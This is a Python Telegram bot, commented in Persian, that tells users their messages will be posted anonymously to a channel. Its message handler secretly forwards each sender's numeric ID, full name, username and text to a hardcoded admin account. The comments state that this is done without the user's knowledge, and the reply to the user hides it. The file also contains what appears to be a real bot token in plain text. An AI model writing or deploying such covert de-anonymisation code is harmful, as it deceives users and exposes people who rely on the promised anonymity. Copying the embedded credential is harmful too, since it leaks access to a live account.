from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# جایگزین کنید با توکن ربات خود
TOKEN = "7669113616:AAH6qqabVjqVu4X44GFrs68AjN3CaEFPoMg"
# شناسه یا نام کاربری کانال (مثال: "@YourChannelUsername" یا -1001234567890)
CHANNEL_ID = "@im_sadegh"
# آیدی عددی شما (ادمین) برای دریافت آگاهانه پیام‌های خصوصی
ADMIN_CHAT_ID = 5280481527  # 👈 این عدد را با آیدی عددی خودتان جایگزین کنید


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """
    فرمان /start برای خوش‌آمدگویی کاربر و توضیح عملکرد ربات
    """
    await update.message.reply_text(
        "سلام! این یک ربات پیام ناشناس است. هر پیامی که اینجا بفرستید به صورت ناشناس در کانال منتشر خواهد شد."
    )


async def setup(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """
    فرمان /setup برای ارسال یک پیام به کانال با دکمه شیشه‌ای که کاربر را به ربات هدایت می‌کند
    """
    bot_info = await context.bot.get_me()
    bot_username = bot_info.username

    # ساخت دکمه شیشه‌ای با لینک به ربات
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("ارسال پیام ناشناس",
                              url=f"https://t.me/{bot_username}")]
    ])

    await context.bot.send_message(
        chat_id=CHANNEL_ID,
        text="برای ارسال پیام ناشناس روی دکمه زیر کلیک کنید:",
        reply_markup=keyboard
    )
    await update.message.reply_text("🔧 تنظیمات کانال انجام شد.")


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """
    این هندلر تمام پیام‌های متنی خصوصی را دریافت کرده
    و بدون افشای هویت فرستنده به کانال ارسال می‌کند
    همچنین آیدی فرستنده را بدون اطلاع کاربر به ادمین اطلاع می‌دهد
    """
    if update.message.chat.type == "private":
        user_text = update.message.text
        user_id = update.message.from_user.id
        user_name = update.message.from_user.username or "---"
        full_name = update.message.from_user.full_name

        # ارسال پیام به کانال به صورت ناشناس
        await context.bot.send_message(
            chat_id=CHANNEL_ID,
            text=f"📩 پیام ناشناس:\n{user_text}"
        )

        # ارسال اطلاعات فرستنده به ادمین بدون اطلاع‌رسانی به کاربر
        hidden_report = f"📥 پیام جدید ناشناس:\n🆔 آیدی عددی: {user_id}\n👤 نام کامل: {full_name}\n🔗 نام کاربری: @{user_name if user_name != '---' else 'ندارد'}\n📨 متن پیام:\n{user_text}"

        await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=hidden_report)

        # پاسخ کاربر بدون هیچ اشاره‌ای به شناسایی او
        await update.message.reply_text("✅ پیام شما به صورت ناشناس ارسال شد!")


def main() -> None:
    """
    نقطه ورود برنامه
    """
    app = ApplicationBuilder().token(TOKEN).build()

    # ثبت فرمان‌ها و هندلرها
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("setup", setup))
    app.add_handler(MessageHandler(
        filters.TEXT & ~filters.COMMAND, handle_message))

    # اجرای ربات
    app.run_polling()


if __name__ == "__main__":
    main()
